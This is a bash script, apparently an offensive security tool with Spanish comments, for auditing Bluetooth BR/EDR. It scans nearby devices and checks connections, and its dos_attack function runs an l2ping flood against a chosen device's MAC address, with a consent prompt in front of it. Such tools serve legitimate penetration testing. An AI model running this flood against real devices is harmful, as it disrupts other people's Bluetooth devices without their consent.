#!/usr/bin/env bash
#
# bluedeath - Bluetooth BR/EDR offensive auditor
# Author: theoffsecgirl
#
# Soporta dos stacks:
#   - Moderno: bluetoothctl + btmgmt (kernels >= 5.x)
#   - Legacy:  hcitool + hciconfig   (BlueZ antiguo)
# Detecta automaticamente cual esta disponible.
#
# Uso:
#   sudo ./bluedeath.sh --menu
#   sudo ./bluedeath.sh --scan
#   sudo ./bluedeath.sh --active
#   sudo ./bluedeath.sh --dos AA:BB:CC:DD:EE:FF
#   sudo BT_INTERFACE=hci1 ./bluedeath.sh --scan
#

set -o nounset
set -o pipefail

# ---------- Config ---------- #

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="${SCRIPT_DIR}/logs"
LAST_SCAN_FILE="${LOG_DIR}/last_scan.txt"
LOG_FILE="${LOG_DIR}/bluedeath_$(date +%F_%H-%M-%S).log"
BT_INTERFACE="${BT_INTERFACE:-hci0}"

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
PURPLE="\e[35m"
RESET="\e[0m"

# Stack detectado: "modern" | "legacy" | ""
BT_STACK=""

# ---------- Helpers ---------- #

log()   { mkdir -p "${LOG_DIR}"; printf "[%s] %s\n" "$(date +'%F %T')" "$1" | tee -a "${LOG_FILE}"; }
info()  { printf "${BLUE}[i]${RESET} %s\n" "$1"; }
ok()    { printf "${GREEN}[+]${RESET} %s\n" "$1"; }
warn()  { printf "${YELLOW}[!]${RESET} %s\n" "$1"; }
error() { printf "${RED}[-] %s${RESET}\n" "$1" >&2; }

require_root() {
    if [[ "${EUID}" -ne 0 ]]; then
        error "bluedeath requiere privilegios de superusuario. Ejecuta con sudo."
        exit 1
    fi
}

detect_stack() {
    if command -v bluetoothctl &>/dev/null && command -v btmgmt &>/dev/null; then
        BT_STACK="modern"
        info "Stack detectado: bluetoothctl + btmgmt (moderno)"
    elif command -v hcitool &>/dev/null && command -v hciconfig &>/dev/null; then
        BT_STACK="legacy"
        warn "Stack detectado: hcitool + hciconfig (deprecated). Considera instalar bluez >= 5.50."
    else
        error "No se encontro ningun stack Bluetooth compatible."
        printf "  Instala: sudo apt install bluez\n"
        exit 1
    fi

    if ! command -v l2ping &>/dev/null; then
        warn "l2ping no encontrado. Las funciones --active y --dos no estaran disponibles."
    fi
}

check_interface() {
    case "${BT_STACK}" in
        modern)
            if ! btmgmt info 2>/dev/null | grep -q "hci"; then
                error "No se detectaron interfaces Bluetooth activas."
                exit 1
            fi
            ;;
        legacy)
            if ! hciconfig "${BT_INTERFACE}" &>/dev/null; then
                error "La interfaz '${BT_INTERFACE}' no existe o no esta activa."
                printf "Comprueba 'hciconfig' o ajusta BT_INTERFACE.\n"
                exit 1
            fi
            ;;
    esac
}

banner() {
    printf "${PURPLE}"
    cat <<'EOF'
+------------------------------------------------------+
|                                                      |
|  ██████╗ ██╗     ██╗   ██████╗ ███████╗             |
|  ██╔══██╗██║     ██║  ██╔════╝ ██╔════╝             |
|  ██████╔╝██║     ██║  ██║  ███╗█████╗               |
|  ██╔══██╗██║     ██║  ██║   ██║██╔══╝               |
|  ██████╔╝███████╗██║  ╚██████╔╝███████╗             |
|  ╚═════╝ ╚══════╝╚═╝   ╚═════╝ ╚══════╝             |
|                                                      |
|  ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗          |
|  ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║          |
|  ██║  ██║█████╗  ███████║   ██║   ███████║          |
|  ██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║          |
|  ██████╔╝███████╗██║  ██║   ██║   ██║  ██║          |
|  ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝          |
|                                                      |
|  Bluetooth BR/EDR offensive auditor                 |
|  by theoffsecgirl                                   |
+------------------------------------------------------+
EOF
    printf "${RESET}"
    printf "  Interface : %s\n" "${BT_INTERFACE}"
    printf "  Stack     : %s\n\n" "${BT_STACK}"
}

usage() {
    cat <<EOF
Uso: sudo ./bluedeath.sh [opcion]

Opciones:
  --scan            Escanea dispositivos Bluetooth BR/EDR cercanos
  --connected       Muestra conexiones Bluetooth activas
  --inquiry         Inquiry scan (dispositivos conectables)
  --active          Comprueba dispositivos activos via l2ping
  --dos MAC         l2ping flood controlado contra MAC
  --interface IF    Usa la interfaz IF (default: hci0)
  --menu            Menu interactivo
  -h, --help        Esta ayuda

Variable de entorno:
  BT_INTERFACE=hci1 sudo ./bluedeath.sh --scan
EOF
}

# ---------- Core: moderno ---------- #

scan_modern() {
    info "Iniciando escaneo con bluetoothctl (10s)…"
    mkdir -p "${LOG_DIR}"

    # bluetoothctl scan on durante 10 segundos, capturamos NEW y CHG Device
    timeout 10 bluetoothctl scan on 2>/dev/null | grep -E "Device [0-9A-F:]{17}" \
        | awk '{print $3, $4}' | sort -u | tee "${LAST_SCAN_FILE}" || true

    # Complementamos con btmgmt find para dispositivos BR/EDR
    btmgmt find 2>/dev/null | grep -E "^[0-9A-F:]{17}" | tee -a "${LAST_SCAN_FILE}" || true

    sort -u "${LAST_SCAN_FILE}" -o "${LAST_SCAN_FILE}" 2>/dev/null || true
    ok "Escaneo completado. Resultados en ${LAST_SCAN_FILE}"
    log "Scan moderno completado."
}

list_connected_modern() {
    info "Dispositivos pareados/conectados (bluetoothctl):"
    bluetoothctl devices Connected 2>/dev/null || bluetoothctl devices 2>/dev/null | head -20
}

inquiry_modern() {
    info "Inquiry scan con btmgmt (BR/EDR, 15s)…"
    btmgmt find --bredr 2>/dev/null | tee -a "${LOG_FILE}" || {
        warn "btmgmt find --bredr no soportado. Usando bluetoothctl…"
        timeout 15 bluetoothctl scan on 2>/dev/null | grep -E "Device" | tee -a "${LOG_FILE}" || true
    }
}

# ---------- Core: legacy ---------- #

scan_legacy() {
    info "Iniciando escaneo con hcitool scan…"
    mkdir -p "${LOG_DIR}"

    if ! hcitool -i "${BT_INTERFACE}" scan > "${LAST_SCAN_FILE}" 2>>"${LOG_FILE}"; then
        error "Error durante el escaneo."
        return 1
    fi

    ok "Escaneo completado."
    sed '1d' "${LAST_SCAN_FILE}" || true
    log "Scan legacy completado."
}

list_connected_legacy() {
    info "Conexiones activas (hcitool con):"
    hcitool con | tee -a "${LOG_FILE}"
}

inquiry_legacy() {
    info "Inquiry scan con hcitool inq…"
    hcitool -i "${BT_INTERFACE}" inq | tee -a "${LOG_FILE}"
}

# ---------- Dispatch por stack ---------- #

scan_devices() {
    banner
    case "${BT_STACK}" in
        modern) scan_modern ;;
        legacy) scan_legacy ;;
    esac
}

list_connected() {
    banner
    case "${BT_STACK}" in
        modern) list_connected_modern ;;
        legacy) list_connected_legacy ;;
    esac
}

inquiry_scan() {
    banner
    case "${BT_STACK}" in
        modern) inquiry_modern ;;
        legacy) inquiry_legacy ;;
    esac
}

# ---------- Seleccion de dispositivo ---------- #

select_device_from_last_scan() {
    if [[ ! -f "${LAST_SCAN_FILE}" ]] || [[ ! -s "${LAST_SCAN_FILE}" ]]; then
        error "No hay resultados de escaneo previos. Ejecuta primero --scan."
        return 1
    fi

    # Extraer MACs validas (formato XX:XX:XX:XX:XX:XX)
    mapfile -t macs < <(grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${LAST_SCAN_FILE}" | sort -u)

    if (( ${#macs[@]} == 0 )); then
        error "No se encontraron MACs validas en el ultimo escaneo."
        return 1
    fi

    printf "\nDispositivos detectados:\n"
    for i in "${!macs[@]}"; do
        printf "  [%d] %s\n" "$((i+1))" "${macs[$i]}"
    done

    printf "\nSelecciona un dispositivo por numero: "
    read -r choice

    if ! [[ "${choice}" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#macs[@]} )); then
        error "Seleccion no valida."
        return 1
    fi

    SELECTED_MAC="${macs[choice-1]}"
    ok "Seleccionado: ${SELECTED_MAC}"
    return 0
}

# ---------- Active check y DoS (l2ping) ---------- #

check_active_devices() {
    banner
    if ! command -v l2ping &>/dev/null; then
        error "l2ping no disponible. Instala bluez-tools."
        return 1
    fi

    if ! select_device_from_last_scan; then return 1; fi

    info "Enviando 3 paquetes l2ping a ${SELECTED_MAC}…"
    if l2ping -i "${BT_INTERFACE}" -c 3 "${SELECTED_MAC}" 2>&1 | tee -a "${LOG_FILE}"; then
        ok "Dispositivo activo."
    else
        warn "El dispositivo no respondio a l2ping."
    fi
}

dos_attack() {
    local mac="$1"
    banner

    if ! command -v l2ping &>/dev/null; then
        error "l2ping no disponible. Instala bluez-tools."
        return 1
    fi

    warn "Vas a iniciar un l2ping flood contra: ${mac}"
    printf "Usa esto SOLO en entornos controlados y con autorizacion explicita.\n"
    printf "Continuar? [y/N]: "
    read -r confirm

    if [[ "${confirm}" != "y" && "${confirm}" != "Y" ]]; then
        info "Operacion cancelada."
        return
    fi

    info "Iniciando l2ping flood (CTRL+C para detener)…"
    log "l2ping flood contra ${mac} desde ${BT_INTERFACE}"

    l2ping -i "${BT_INTERFACE}" -f "${mac}" 2>&1 | tee -a "${LOG_FILE}" || true
    ok "l2ping flood detenido."
}

# ---------- Menu ---------- #

show_menu() {
    while true; do
        banner
        cat <<EOF
  [1] Escanear dispositivos Bluetooth
  [2] Ver conexiones activas
  [3] Inquiry scan (BR/EDR)
  [4] Comprobar dispositivo activo (l2ping)
  [5] l2ping flood (DoS controlado)
  [6] Info de interfaz
  [7] Salir
EOF
        printf "\nOpcion: "
        read -r opt

        case "${opt}" in
            1) scan_devices;         read -rp $'\nENTER para continuar… ' _ ;;
            2) list_connected;       read -rp $'\nENTER para continuar… ' _ ;;
            3) inquiry_scan;         read -rp $'\nENTER para continuar… ' _ ;;
            4) check_active_devices; read -rp $'\nENTER para continuar… ' _ ;;
            5)
                if [[ ! -f "${LAST_SCAN_FILE}" ]] || [[ ! -s "${LAST_SCAN_FILE}" ]]; then
                    warn "Ejecuta primero la opcion 1 (escaneo)."
                    read -rp $'\nENTER para continuar… ' _
                    continue
                fi
                if select_device_from_last_scan; then
                    dos_attack "${SELECTED_MAC}"
                fi
                read -rp $'\nENTER para continuar… ' _
                ;;
            6)
                printf "\nInterfaz: %s  |  Stack: %s\n" "${BT_INTERFACE}" "${BT_STACK}"
                case "${BT_STACK}" in
                    modern) btmgmt info 2>/dev/null | head -10 || bluetoothctl show 2>/dev/null | head -10 ;;
                    legacy) hciconfig "${BT_INTERFACE}" 2>/dev/null || true ;;
                esac
                read -rp $'\nENTER para continuar… ' _
                ;;
            7) info "Saliendo."; exit 0 ;;
            *) warn "Opcion no valida." ;;
        esac
    done
}

# ---------- Args ---------- #

main() {
    require_root
    detect_stack
    check_interface

    if (( $# == 0 )); then
        show_menu
        exit 0
    fi

    local action=""
    local dos_mac=""

    while (( $# > 0 )); do
        case "$1" in
            --scan)      action="scan";      shift ;;
            --connected) action="connected"; shift ;;
            --inquiry)   action="inquiry";   shift ;;
            --active)    action="active";    shift ;;
            --menu)      action="menu";      shift ;;
            --dos)
                action="dos"
                dos_mac="${2:-}"
                [[ -z "${dos_mac}" ]] && { error "Uso: --dos MAC"; exit 1; }
                shift 2
                ;;
            --interface)
                BT_INTERFACE="${2:-}"
                [[ -z "${BT_INTERFACE}" ]] && { error "Uso: --interface hciX"; exit 1; }
                shift 2
                ;;
            -h|--help) usage; exit 0 ;;
            *) error "Opcion desconocida: $1"; usage; exit 1 ;;
        esac
    done

    case "${action}" in
        scan)      scan_devices ;;
        connected) list_connected ;;
        inquiry)   inquiry_scan ;;
        active)    check_active_devices ;;
        dos)       dos_attack "${dos_mac}" ;;
        menu)      show_menu ;;
        *)         show_menu ;;
    esac
}

main "$@"
